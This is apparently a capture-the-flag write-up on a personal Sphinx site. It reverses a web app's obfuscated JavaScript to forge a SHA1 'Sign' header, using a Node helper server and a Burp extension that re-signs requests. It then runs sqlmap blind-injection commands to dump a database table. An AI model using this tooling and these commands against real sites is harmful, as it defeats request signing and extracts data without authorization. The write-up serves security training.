<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SignedUrl Hub &mdash; abdelrahman walkthrough 1 documentation</title>
      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
      <link rel="stylesheet" href="../_static/custom.css" type="text/css" />
      <link rel="stylesheet" href="../_static/fonts.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=29a6c3e3"></script>
        <script src="../_static/doctools.js?v=888ff710"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Vidar" href="../mal4/mal4.html" />
    <link rel="prev" title="Agent tesla" href="../mal3/mal3.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            abdelrahman walkthrough
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../lab1/lab1.html">Practical Malware Analysis - Lab 1</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab3/lab3.html">Practical Malware Analysis - Lab 3</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab5/lab5.html">Practical Malware Analysis - Lab 5</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab6/lab6.html">Practical Malware Analysis - Lab 6</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab7/lab7.html">Practical Malware Analysis - Lab 7</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab9/lab9.html">Practical Malware Analysis - Lab 9</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab10/lab10.html">Practical Malware Analysis - Lab 10</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab11/lab11.html">Practical Malware Analysis - Lab 11</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab12/lab12.html">Practical Malware Analysis - Lab 12</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab13/lab13.html">Practical Malware Analysis - Lab 13</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab14/lab14.html">Practical Malware Analysis - Lab 14</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab15/lab15.html">Practical Malware Analysis - Lab 15</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab16/lab16.html">Practical Malware Analysis - Lab 16</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab17/lab17.html">Practical Malware Analysis - Lab 17</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab18/lab18.html">Practical Malware Analysis - Lab 18</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lab19/lab19.html">Practical Malware Analysis - Lab 19</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal1/mal1.html">Princess Locker</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal2/mal2.html">Blackcat Ransomware</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal3/mal3.html">Agent tesla</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">SignedUrl Hub</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal4/mal4.html">Vidar</a></li>
<li class="toctree-l1"><a class="reference internal" href="../laugh/chals.html">0xLaugh Rev Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal5/agenttesla.html">Agent Tesla Malware Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal6/remcos.html">Remcos Malware Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../confus/agentsmtp.html">Agent tesla (sample1)</a></li>
<li class="toctree-l1"><a class="reference internal" href="../mal8/sample2.html">AndroMeda Malware analysis</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">abdelrahman walkthrough</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content style-external-links">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">SignedUrl Hub</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/SignedUrl/text.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="signedurl-hub">
<h1>SignedUrl Hub<a class="headerlink" href="#signedurl-hub" title="Link to this heading"></a></h1>
<p>The challenge is a mimic from this report <a class="reference external" href="https://buer.haus/2024/01/16/reversing-and-tooling-a-signed-request-hash-in-obfuscated-javascript/">https://buer.haus/2024/01/16/reversing-and-tooling-a-signed-request-hash-in-obfuscated-javascript/</a></p>
<p>We got a simple webApp which our goal is to get article ID 3 to get the flag</p>
<p>we got only two articles 1,2</p>
<img alt="../_images/Screenshot_1.png" src="../_images/Screenshot_1.png" />
<p>and the request to get an article is below</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>GET /api/article?id=2 HTTP/1.1
Host: k34m4yau.ctfio.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://k34m4yau.ctfio.com/
Content-Type: application/json
Time: 1705844109476
Sign: 93035f0722e901ca6519fd0c2b36f77bf4f4de2e
User-Id: 1234
Connection: close
</pre></div>
</div>
<p>so we change id to 3 but we get 401, it doesnt accept changes the front end needs to sign the request and add its Sign header</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 21 Jan 2024 14:16:17 GMT
Content-Type: application/json
Connection: close
Content-Length: 58

{&quot;error&quot;:{&quot;code&quot;:401,&quot;message&quot;:&quot;Please refresh the page&quot;}}
</pre></div>
</div>
<p>we go to the js files, there are only two files sha1.js which is from <a class="reference external" href="https://github.com/emn178/js-sha1">https://github.com/emn178/js-sha1</a> and main.js</p>
<img alt="../_images/Screenshot_2.png" src="../_images/Screenshot_2.png" />
<p>the main.js is obfuscated and there is a list of strings and indexer function _0x13dd which replaces bits of code to hide code intent</p>
<img alt="../_images/Screenshot_3.png" src="../_images/Screenshot_3.png" />
<p>we search for “sign” to see where it is set, and set a breakpoint there</p>
<img alt="../_images/Screenshot_4.png" src="../_images/Screenshot_4.png" />
<div class="line-block">
<div class="line">the  ` const _0x17f0a4 = _0x13dd;` is the indexer used in obfuscation</div>
<div class="line">Lets deobfuscate the code here by using the console</div>
<div class="line">First the “method” parameter has _0x17f0a4(319) which is “GET”</div>
</div>
<img alt="../_images/Screenshot_5.png" src="../_images/Screenshot_5.png" />
<p>in the samy way, the timastamp parameter which is set in  let _0x383605 = Date[‘now’]() [_0x17f0a4(377)]();</p>
<img alt="../_images/Screenshot_6.png" src="../_images/Screenshot_6.png" />
<div class="line-block">
<div class="line">and user_id is hardcoded 1234 and the last thing is signature which is set in _0x356503(_0x17f0a4(338) + _0x876803, _0x383605, _0x17f0a4(335))</div>
<div class="line">decoded with indexer _0x17f0a4 to   _0x356503(“/api/article?id=”  + _0x876803, _0x383605, 1234)</div>
<div class="line">and _0x383605 is the timeStamp set above Date[‘now’]().toString()</div>
<div class="line">and _0x876803 is what is put in the id parameter</div>
<div class="line">Now we have all the parameter, lets step into _0x356503 function, we get the sha1 function</div>
</div>
<img alt="../_images/Screenshot_7.png" src="../_images/Screenshot_7.png" />
<div class="line-block">
<div class="line">so it runs sha1 with the provided parameters and returns the output to be set as “Sign” header</div>
<div class="line">that’s the main function we need for the change in the request to be valid</div>
</div>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>sha1(
        [_0x4cd499(351),
        _0x43ee81,
        _0x36740f,
        _0x3b5808][_0x4cd499(362)](&#39;\n&#39;)
        );
</pre></div>
</div>
<p>_0x4cd499(351) is “pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA”, _0x43ee81 is the timeStamp , _0x36740f is the path in the url plus id paramter, _0x3b5808 is 1234 (user_id)</p>
<img alt="../_images/Screenshot_8.png" src="../_images/Screenshot_8.png" />
<p>which is joined with newline in between and passed to sha1</p>
<p>Now after understanding the JS, we can just use sha1 in console to print our desired “sign” header with this command with 1705851236094 the timeStamp in the request, and /api/article?id=3 is out path</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>test = sha1([&quot;pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA&quot;, &quot;1705851236094&quot;, &quot;/api/article?id=3&quot;, &quot;1234&quot;].join(&quot;\n&quot;));
</pre></div>
</div>
<img alt="../_images/Screenshot_10.png" src="../_images/Screenshot_10.png" />
<p>And we pass the sign check, but the article is not found</p>
<img alt="../_images/Screenshot_11.png" src="../_images/Screenshot_11.png" />
<p>The idea seems like an sql problem, and if we need to pass it to sqlmap (because it was blindsql injection), we would need to automate our sign header with each request made</p>
<p>So i made node server which will just set header Sign based on the request timeStamp, path, idParamter, and user_id = “1234”</p>
<div class="highlight-nodejsrepl notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
<span class="nx">sha1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;js-sha1&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">app</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3000</span><span class="p">;</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="p">,</span><span class="nx">originalUrl</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timeHeader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">headers</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">];</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">rawQuery</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalUrl</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="c1">// console.log(timeHeader)</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">idParameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rawQuery</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateSignature</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span><span class="nx">idParameter</span><span class="p">,</span><span class="w"> </span><span class="nx">timeHeader</span><span class="p">);</span>

<span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span><span class="s1">&#39;Sign&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">);</span>
<span class="nx">next</span><span class="p">();</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/some_endpoint&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">result</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Success&#39;</span><span class="w"> </span><span class="p">});</span>
<span class="p">});</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">generateSignature</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="nx">idParameter</span><span class="p">,</span><span class="nx">timeHeader</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">p4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;1234&quot;</span>
<span class="k">if</span><span class="p">(</span><span class="nx">idParameter</span><span class="w"> </span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>

<span class="w">    </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="sb">`</span><span class="si">${</span><span class="nx">path</span><span class="si">}</span><span class="sb">?id=</span><span class="si">${</span><span class="nx">idParameter</span><span class="si">}</span><span class="sb">`</span>
<span class="p">}</span>
<span class="c1">// console.log(path)</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sha1</span><span class="p">([</span><span class="s2">&quot;pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA&quot;</span><span class="p">,</span><span class="nx">timeHeader</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="p">,</span><span class="w"> </span><span class="nx">p4</span><span class="p">].</span><span class="nx">join</span><span class="p">(</span><span class="s2">&quot;\n&quot;</span><span class="p">));</span>

<span class="k">return</span><span class="w"> </span><span class="nx">signature</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running at http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="p">});</span>
</pre></div>
</div>
<p>And a Burp plugin to pass any request it gets to that server to get the sign header and changes the old sign header with the new</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IBurpExtender</span>
<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IHttpListener</span>
<span class="kn">from</span> <span class="nn">burp</span> <span class="kn">import</span> <span class="n">IInterceptedProxyMessage</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">class</span> <span class="nc">BurpExtender</span><span class="p">(</span><span class="n">IBurpExtender</span><span class="p">,</span> <span class="n">IHttpListener</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">registerExtenderCallbacks</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">callbacks</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span> <span class="o">=</span> <span class="n">callbacks</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span> <span class="o">=</span> <span class="n">callbacks</span><span class="o">.</span><span class="n">getHelpers</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span><span class="o">.</span><span class="n">setExtensionName</span><span class="p">(</span><span class="s2">&quot;Custom Sign Header Extension&quot;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span><span class="o">.</span><span class="n">registerHttpListener</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">processHttpMessage</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">toolFlag</span><span class="p">,</span> <span class="n">messageIsRequest</span><span class="p">,</span> <span class="n">messageInfo</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">messageIsRequest</span> <span class="ow">and</span> <span class="s2">&quot;ctfio.com&quot;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">analyzeRequest</span><span class="p">(</span><span class="n">messageInfo</span><span class="p">)</span><span class="o">.</span><span class="n">getUrl</span><span class="p">()</span><span class="o">.</span><span class="n">toString</span><span class="p">():</span>
            <span class="c1"># Forward the modified request to the localhost server</span>
            <span class="n">response_from_local</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">forwardToLocalhostServer</span><span class="p">(</span><span class="n">messageInfo</span><span class="p">)</span>
            <span class="c1"># Extract the &#39;Sign&#39; header from the response from the localhost server</span>
            <span class="n">sign_header_value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">extractSignHeader</span><span class="p">(</span><span class="n">response_from_local</span><span class="p">)</span>
            <span class="c1"># Modify the original request to include the extracted &#39;Sign&#39; header</span>
            <span class="n">final_request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">modifyOriginalRequest</span><span class="p">(</span><span class="n">messageInfo</span><span class="p">,</span> <span class="n">sign_header_value</span><span class="p">)</span>
            <span class="c1"># Send the modified request to the original destination</span>
            <span class="c1">#self.forwardToOriginalDestination(final_request)</span>

    <span class="k">def</span> <span class="nf">modifyRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">messageInfo</span><span class="p">):</span>
        <span class="n">request_info</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">analyzeRequest</span><span class="p">(</span><span class="n">messageInfo</span><span class="p">)</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="n">request_info</span><span class="o">.</span><span class="n">getHeaders</span><span class="p">()</span>
        <span class="c1"># Add or manipulate headers as needed</span>
        <span class="c1"># Example: headers.add(&quot;Custom-Header: Value&quot;)</span>
        <span class="n">modified_request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">buildHttpMessage</span><span class="p">(</span><span class="n">headers</span><span class="p">,</span> <span class="n">messageInfo</span><span class="o">.</span><span class="n">getRequest</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">modified_request</span>

    <span class="k">def</span> <span class="nf">forwardToLocalhostServer</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">modified_request</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">response_from_local</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span><span class="o">.</span><span class="n">makeHttpRequest</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">3000</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="n">modified_request</span><span class="o">.</span><span class="n">getRequest</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">response_from_local</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error: No response received from localhost server.&quot;</span><span class="p">)</span>
                <span class="k">return</span> <span class="kc">None</span>
            <span class="k">return</span> <span class="n">response_from_local</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error forwarding to localhost server:&quot;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">None</span>




    <span class="k">def</span> <span class="nf">extractSignHeader</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response_from_local</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">response_from_local</span><span class="p">:</span>
            <span class="n">response_from_local</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">analyzeRequest</span><span class="p">(</span><span class="n">response_from_local</span><span class="p">)</span>
            <span class="n">sign_header</span> <span class="o">=</span> <span class="n">response_from_local</span><span class="o">.</span><span class="n">getHeaders</span><span class="p">()</span>
            <span class="k">for</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">sign_header</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">header</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;Sign:&#39;</span><span class="p">):</span>
                    <span class="c1"># Extract the value of &#39;Sign&#39; header</span>
                    <span class="n">sign_header</span> <span class="o">=</span> <span class="n">header</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
                    <span class="k">return</span> <span class="n">sign_header</span>
            <span class="k">if</span> <span class="n">sign_header</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">sign_header</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sign header not found in the response&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Invalid response or headers&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">None</span>


    <span class="k">def</span> <span class="nf">modifyOriginalRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">original_request</span><span class="p">,</span> <span class="n">sign_header</span><span class="p">):</span>
        <span class="n">original_headers</span> <span class="o">=</span> <span class="n">original_request</span><span class="o">.</span><span class="n">getRequest</span><span class="p">()</span>
        <span class="n">original_headers</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_helpers</span><span class="o">.</span><span class="n">analyzeRequest</span><span class="p">(</span><span class="n">original_headers</span><span class="p">)</span>
        <span class="n">original_headers</span> <span class="o">=</span> <span class="n">original_headers</span><span class="o">.</span><span class="n">getHeaders</span><span class="p">()</span>
        <span class="n">original_headers_copy</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">original_headers</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">original_headers_copy</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">header</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;Sign:&quot;</span><span class="p">):</span>
                <span class="n">original_headers</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>

        <span class="c1"># Add the new Sign header</span>
        <span class="n">original_headers</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="s2">&quot;Sign: &quot;</span> <span class="o">+</span> <span class="n">sign_header</span><span class="p">)</span>

        <span class="n">httpRequest</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_callbacks</span><span class="o">.</span><span class="n">getHelpers</span><span class="p">()</span><span class="o">.</span><span class="n">buildHttpMessage</span><span class="p">(</span><span class="n">original_headers</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
        <span class="n">original_request</span><span class="o">.</span><span class="n">setRequest</span><span class="p">(</span><span class="n">httpRequest</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">original_request</span>


<span class="c1"># Instantiate the extension</span>
<span class="n">burp_extender</span> <span class="o">=</span> <span class="n">BurpExtender</span><span class="p">()</span>
</pre></div>
</div>
<p>So diagram be like this, from <a class="reference external" href="https://buer.haus/2024/01/16/reversing-and-tooling-a-signed-request-hash-in-obfuscated-javascript/">https://buer.haus/2024/01/16/reversing-and-tooling-a-signed-request-hash-in-obfuscated-javascript/</a></p>
<img alt="../_images/diagram2-1024x741.png" src="../_images/diagram2-1024x741.png" />
<p>Then load my plugin into burp</p>
<img alt="../_images/Screenshot_12.png" src="../_images/Screenshot_12.png" />
<p>Now i dont need to worry about the sign header, every change i make is automatically updated</p>
<img alt="../_images/Screenshot_13.png" src="../_images/Screenshot_13.png" />
<p>Now all that’s left is sqlmap with proxy to burp <cite>sqlmap -r sreq –proxy http://127.0.0.1:8080 -p “id”</cite></p>
<p>and i dump the contents columns <code class="docutils literal notranslate"><span class="pre">sqlmap</span> <span class="pre">-r</span> <span class="pre">sreq</span> <span class="pre">--proxy</span> <span class="pre">http://127.0.0.1:8080</span> <span class="pre">-p</span> <span class="pre">&quot;id&quot;</span> <span class="pre">--dump</span> <span class="pre">-C</span> <span class="pre">contents</span> <span class="pre">-T</span> <span class="pre">article</span> <span class="pre">-D</span> <span class="pre">news</span> <span class="pre">--level=5</span> <span class="pre">--risk=3</span></code> and i find the flag</p>
<img alt="../_images/Screenshot_64.png" src="../_images/Screenshot_64.png" />
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../mal3/mal3.html" class="btn btn-neutral float-left" title="Agent tesla" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../mal4/mal4.html" class="btn btn-neutral float-right" title="Vidar" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2023, abdelrahman khaled.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>